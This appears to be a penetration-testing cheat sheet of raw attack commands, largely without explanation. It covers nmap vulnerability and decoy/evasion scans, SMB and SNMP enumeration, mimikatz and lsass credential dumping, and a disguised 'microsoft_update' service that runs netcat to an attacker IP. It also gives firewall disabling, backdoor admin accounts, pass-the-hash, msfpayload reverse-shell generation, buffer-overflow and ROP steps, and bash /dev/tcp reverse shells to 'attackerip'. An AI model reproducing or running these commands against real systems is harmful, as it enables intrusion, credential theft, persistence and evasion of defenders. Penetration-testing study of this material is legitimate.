**Nmap Full Web Vulnerable Scan:**

mkdir /usr/share/nmap/scripts/vulscan

cd /usr/share/nmap/scrripts/vulscan

wget http://www.computec.ch/projekte/vulscan/download/nmap\_nse\_vulscan-2.0.tar.gz && tar xzf nmap\_nse\_vulscan-2.0.tar.gz

nmap -sS -sV –script=vulscan/vulscan.nse target

nmap -sS -sV –script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target

nmap -sS -sV –script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target

nmap -PN -sS -sV –script=vulscan –script-args vulscancorrelation=1 -p80 target

nmap -sV –script=vuln target

nmap -PN -sS -sV –script=all –script-args vulscancorrelation=1 target

**Dirb Directory Bruteforce:**

dirb http://IP:PORT dirbuster-ng-master/wordlists/common.txt

**Nikto Scanner:**

nikto -C all -h http://IP

**WordPress Scanner:**

wpscan –url http://IP/ –enumerate p

**Uniscan Scanning:**

uniscan.pl -u target -qweds

**HTTP Enumeration:**

httprint -h http://www.example.com -s signatures.txt

**SKIP Fish Scanner:**

skipfish -m 5 -LVY -W /usr/share/skipfish/dictionaries/complete.wl -u http://IP

**Uniscan Scanning:**

uniscan –u http://www.hubbardbrook.org –qweds

Here, -q – Enable Directory checks

-w – Enable File Checks

-e – Enable robots.txt and sitemap.xml check

-d – Enable Dynamic checks

-s – Enable Static checks

**Skipfish Scanning:**

m-time threads -LVY donot update after result

skipfish -m 5 -LVY -W /usr/share/skipfish/dictionaries/complete.wl -u http://IP

**Nmap Ports Scan:**

1\)decoy- masqurade nmap -D RND:10 \[target\] \(Generates a random number of decoys\)

1\)decoy- masqurade nmap -D RND:10 \[target\] \(Generates a random number of decoys\)

2\)fargement

3\)data packed – like orginal one not scan packet

4\)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target

5\) nmap –source-port 53 target

nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target \( Randomize scan form diff IP\)

nmap -Pn -T2 -sV –randomize-hosts IP1,IP2

nmap –script smb-check-vulns.nse -p445 target \(using NSE scripts\)

nmap -sU -P0 -T Aggressive -p123 target \(Aggresive Scan T1-T5\)

nmap -sA -PN -sN target

nmap -sS -sV -T5 -F -A -O target \(version detection\)

nmap -sU -v target \(Udp\)

nmap -sU -P0 \(Udp\)

nmap -sC 192.168.31.10-12 \(all scan default\)

**Netcat Scanning:**

nc -v -w 1 target -z 1-1000

for i in {10..12}; do nc -vv -n -w 1 192.168.34.$i 21-25 -z; done

**US Scanning:**

us -H -msf -Iv 192.168.31.20 -p 1-65535 && us -H -mU -Iv 192.168.31.20 -p 1-65535

**Unicornscan Scanning:**

unicornscan X.X.X.X:a -r10000 -v

**Kernel Scanning:**

xprobe2 -v -p tcp:80:open 192.168.6.66

**Samba Enumeartion:**

nmblookup -A target

smbclient //MOUNT/share -I target -N

rpcclient -U “” target

enum4linux target

**SNMP Enumeration:**

snmpget -v 1 -c public IP version

snmpwalk -v 1 -c public IP

snmpbulkwalk -v 2 -c public IP

Windows Useful commands:

net localgroup Users

net localgroup Administrators

search dir/s \*.doc

system\(“start cmd.exe /k $cmd”\)

sc create microsoft\_update binpath=”cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe” start= auto error= ignore

/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779

mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”

Procdump.exe -accepteula -ma lsass.exe lsass.dmp

mimikatz.exe “sekurlsa::minidump lsass.dmp” “log” “sekurlsa::logonpasswords”

C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits

C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits

Plink Tunnel:

plink.exe -P 22 -l root -pw “1234” -R 445:127.0.0.1:445 X.X.X.X



Enable RDP Access:

reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG\_DWORD /d 0

netsh firewall set service remoteadmin enable

netsh firewall set service remotedesktop enable

Turn Off Firewall:

netsh firewall set opmode disable

Meterpreter:

run getgui -u admin -p 1234

run vnc -p 5043

Add User Windows:

net user test 1234 /add

net localgroup administrators test /add

Mimikatz:

privilege::debug

sekurlsa::logonPasswords full

Passing the Hash:

pth-winexe -U hash //IP cmd

Password Cracking using Hashcat:

hashcat -m 400 -a 0 hash /root/rockyou.txt

Netcat commands:

c:&gt; nc -l -p 31337

\#nc 192.168.0.10 31337

c:&gt; nc -v -w 30 -p 31337 -l &lt; secret.txt

\#nc -v -w 2 192.168.0.10 31337 &gt; secret.txt

Banner Grabbing:

nc 192.168.0.10 80

GET / HTTP/1.1

Host: 192.168.0.10

User-Agent: SPOOFED-BROWSER

Referrer: K0NSP1RACY.COM

&lt;enter&gt;

&lt;enter&gt;

window reverse shell:

c:&gt;nc -Lp 31337 -vv -e cmd.exe

nc 192.168.0.10 31337

c:&gt;nc rogue.k0nsp1racy.com 80 -e cmd.exe

nc -lp 80

\#nc -lp 31337 -e /bin/bash

nc 192.168.0.11 31337

nc -vv -r\(random\) -w\(wait\) 1 192.168.0.10 -z\(i/o error\) 1-1000

Find all SUID root files:

find / -user root -perm -4000 -print

Find all SGID root files:

find / -group root -perm -2000 -print

Find all SUID and SGID files owned by anyone:

find / -perm -4000 -o -perm -2000 -print

Find all files that are not owned by any user:

find / -nouser -print

Find all files that are not owned by any group:

find / -nogroup -print

Find all symlinks and what they point to:

find / -type l -ls

Python:

python -c ‘import pty;pty.spawn\(“/bin/bash”\)’

python -m SimpleHTTPServer \(Starting HTTP Server\)

PID:

fuser -nv tcp 80 \(list PID of process\)

fuser -k -n tcp 80 \(Kill Process of PID\)

Hydra:

hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp \(Self Explanatory\)

Mount Remote Windows Share:

smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw

Compiling Exploit in Kali:

gcc -m32 -o output32 hello.c \(32 bit\)

gcc -o output hello.c \(64 bit\)

Compiling Windows Exploits on Kali:

cd /root/.wine/drive\_c/MinGW/bin

wine gcc -o ability.exe /tmp/exploit.c -lwsock32

wine ability.exe

NASM Command:

nasm -f bin -o payload.bin payload.asm

nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload

SSH Pivoting:

ssh -D 127.0.0.1:1080 -p 22 user@IP

Add socks4 127.0.0.1 1080 in /etc/proxychains.conf

proxychains commands target

Pivoting to One Network to Another:

ssh -D 127.0.0.1:1080 -p 22 user1@IP1

Add socks4 127.0.0.1 1080 in /etc/proxychains.conf

proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2

Add socks4 127.0.0.1 1081 in /etc/proxychains.conf

proxychains commands target

Pivoting Using metasploit:

route add 10.1.1.0 255.255.255.0 1

route add 10.2.2.0 255.255.255.0 1

use auxiliary/server/socks4a

run

proxychains msfcli windows/\* PAYLOAD=windows/meterpreter/reverse\_tcp LHOST=IP LPORT=443 RHOST=IP E

Exploit-DB search using CSV File:

searchsploit-rb –update

searchsploit-rb -t webapps -s WEBAPP

searchsploit-rb –search=”Linux Kernel”

searchsploit-rb -a “author name” -s “exploit name”

searchsploit-rb -t remote -s “exploit name”

searchsploit-rb -p linux -t local -s “exploit name”

For Privilege Escalation Exploit search:

cat files.csv \| grep -i linux \| grep -i kernel \| grep -i local \| grep -v dos \| uniq \| grep 2.6 \| egrep “&lt;\|&lt;=” \| sort -k3

Metasploit Payloads:

msfpayload windows/meterpreter/reverse\_tcp LHOST=10.10.10.10 X &gt; system.exe

msfpayload php/meterpreter/reverse\_tcp LHOST=10.10.10.10 LPORT=443 R &gt; exploit.php

msfpayload windows/meterpreter/reverse\_tcp LHOST=10.10.10.10 LPORT=443 R \| msfencode -t asp -o file.asp

msfpayload windows/meterpreter/reverse\_tcp LHOST=X.X.X.X LPORT=443 R \| msfencode -e x86/shikata\_ga\_nai -b “\x00″ -t c

Create a Linux Reverse Meterpreter Binary

msfpayload linux/x86/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; R \| msfencode -t elf -o shell

Create Reverse Shell \(Shellcode\)

msfpayload windows/shell\_reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; R \| msfencode -b “\x00\x0a\x0d”

Create a Reverse Shell Python Script

msfpayload cmd/unix/reverse\_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; R &gt; shell.py

Create a Reverse ASP Shell

msfpayload windows/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; R \| msfencode -t asp -o shell.asp

Create a Reverse Bash Shell

msfpayload cmd/unix/reverse\_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; R &gt; shell.sh

Create a Reverse PHP Shell

msfpayload php/meterpreter\_reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; R &gt; shell.php

Edit shell.php in a text editor to add &lt;?php at the beginning.

Create a Windows Reverse Meterpreter Binary

msfpayload windows/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; X &gt;shell.exe

Security Commands In Linux:

find programs with a set uid bit

\# find / -uid 0 -perm -4000

find things that are world writable

\# find / -perm -o=w

find names with dots and spaces, there shouldn’t be any

\# find / -name ” ” -print

\# find / -name “..” -print

\# find / -name “. ” -print

\# find / -name ” ” -print

find files that are not owned by anyone

\# find / -nouser

look for files that are unlinked

\# lsof +L1

get information about procceses with open ports

\# lsof -i

look for weird things in arp

\# arp -a

look at all accounts including AD

\# getent passwd

look at all groups and membership including AD

\# getent group

list crontabs for all users including AD

\# for user in $\(getent passwd\|cut -f1 -d:\); do echo “\#\#\# Crontabs for $user \#\#\#\#”; crontab -u $user -l; done

\#generate random passwords

cat /dev/urandom\| tr -dc ‘a-zA-Z0-9-\_!@\#$%^&\*\(\)\_+{}\|:&lt;&gt;?=’\|fold -w 12\| head -n 4

\# find all immutable files, there should not be any

find . \| xargs -I file lsattr -a file 2&gt;/dev/null \| grep ‘^….i’

\# fix immutable files

chattr -i file

Windows Buffer Overflow Exploitation Commands:

msfpayload windows/shell\_bind\_tcp R \| msfencode -a x86 -b “\x00″ -t c

msfpayload windows/meterpreter/reverse\_tcp LHOST=X.X.X.X LPORT=443 R \| msfencode -e x86/shikata\_ga\_nai -b “\x00″ -t c

COMMONLY USED BAD CHARACTERS:

\x00\x0a\x0d\x20                                            For http request

\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with \(0\n\r\_\)

Useful Commands:

pattern create

pattern offset \(EIP Address\)

pattern offset \(ESP Address\)

add garbage upto EIP value and add \(JMP ESP address\) in EIP . \(ESP = shellcode \)

!pvefindaddr pattern\_create 5000

!pvefindaddr suggest

!pvefindaddr modules

!pvefindaddr nosafeseh

!mona config -set workingfolder C:\Mona\%p

!mona config -get workingfolder

!mona mod

!mona bytearray -b “\x00\x0a”

!mona pc 5000

!mona po EIP

!mona suggest

SEH:

!mona suggest

!mona nosafeseh

nseh=”\xeb\x06\x90\x90″ \(next seh chain\)

iseh= !pvefindaddr p1 -n -o -i \(POP POP RETRUN or POPr32,POPr32,RETN\)

ROP \(DEP\):

!mona modules

!mona ropfunc -m \*.dll -cpb “\x00\x09\x0a’

!mona rop -m \*.dll -cpb “\x00\x09\x0a’ \(auto suggest\)

ASLR:

!mona noaslr

EGG Hunter:

!mona jmp -r esp

!mona egg -t lxxl

\xeb\xc4 \(jump backward -60\)

buff=lxxllxxl+shell

!mona egg -t ‘w00t’

GDB Debugger Commands:

Setting Breakpoint :

break \*\_start

Execute Next Instruction :

next

step

n

s

Continue Execution :

continue

c

Data :

checking ‘REGISTERS’ and ‘MEMORY’

Display Register Values : \(Decimal , Binary , Hex \)

print /d –&gt; Decimal

print /t –&gt; Binary

print /x –&gt; Hex

O/P :

\(gdb\) print /d $eax

$17 = 13

\(gdb\) print /t $eax

$18 = 1101

\(gdb\) print /x $eax

$19 = 0xd

\(gdb\)

Display values of specific memory locations :

command : x/nyz \(Examine\)

n –&gt; Number of fields to display ==&gt;

y –&gt; Format for output ==&gt; c \(character\) , d \(decimal\) , x \(Hexadecimal\)

z –&gt; Size of field to be displayed ==&gt; b \(byte\) , h \(halfword\), w \(word 32 Bit\)

Cheat Codes:

Reverse Shellcode:

BASH:

bash -i &gt;& /dev/tcp/192.168.23.10/443 0&gt;&1

exec /bin/bash 0&0 2&gt;&0

exec /bin/bash 0&0 2&gt;&0

0&lt;&196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&196 &gt;&196 2&gt;&196

0&lt;&196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&196 &gt;&196 2&gt;&196

exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&5 \| while read line; do $line 2&gt;&5 &gt;&5; done \# or: while read line 0&lt;&5; do $line 2&gt;&5 &gt;&5; done

exec 5&lt;&gt;/dev/tcp/attackerip/4444

cat &lt;&5 \| while read line; do $line 2&gt;&5 &gt;&5; done \# or:

while read line 0&lt;&5; do $line 2&gt;&5 &gt;&5; done

/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&1 2&gt;&1

/bin/bash -i &gt; /dev/tcp/192.168.23.10/443 0&lt;&1 2&gt;&1





